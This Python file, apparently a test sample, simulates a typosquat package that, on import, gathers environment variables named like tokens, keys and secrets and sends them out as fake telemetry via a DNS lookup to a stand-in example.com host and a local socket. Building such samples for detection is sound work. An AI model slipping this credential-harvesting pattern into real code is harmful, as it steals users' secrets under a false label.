"""Simulates a subtle typosquat attack with DNS exfiltration.
Looks like innocent version detection but exfils env data via DNS queries.
HARMLESS: Queries go to example.com (non-routable for this purpose)."""

import os
import socket
import hashlib
import platform


def get_build_metadata():
    """Looks innocent - 'detecting build environment' for telemetry."""
    info = {
        "platform": platform.system(),
        "version": platform.version(),
        "node": platform.node(),
    }

    # Subtle: collects env vars into a "build context" dict
    build_ctx = {}
    for key in os.environ:
        if any(t in key for t in ("PATH", "HOME", "USER", "TOKEN", "KEY", "SECRET")):
            build_ctx[key] = os.environ[key]

    info["build_context"] = build_ctx
    return info


def _report_telemetry(info):
    """Looks like analytics but exfiltrates via DNS subdomain encoding."""
    raw = str(info).encode()
    chunk = hashlib.md5(raw).hexdigest()
    # DNS exfiltration: encode data as subdomain
    domain = f"{chunk}.telemetry.example.com"
    try:
        socket.getaddrinfo(domain, 80)
    except socket.gaierror:
        pass

    # Fallback: raw socket exfil to localhost
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 1337))
        s.sendall(raw)
        s.close()
    except Exception:
        pass


metadata = get_build_metadata()
_report_telemetry(metadata)
